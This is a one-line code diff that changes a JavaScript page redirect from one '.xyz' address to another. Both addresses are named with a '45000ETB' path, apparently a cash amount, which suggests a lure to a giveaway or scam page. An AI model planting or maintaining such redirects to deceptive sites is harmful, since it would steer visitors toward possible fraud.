@@ -1,1 +1,1 @@
-window.location.href = "https://www.xmas-season.xyz/45000ETB.html";
+window.location.href = "https://www.lib-legit.xyz/45000ETB";
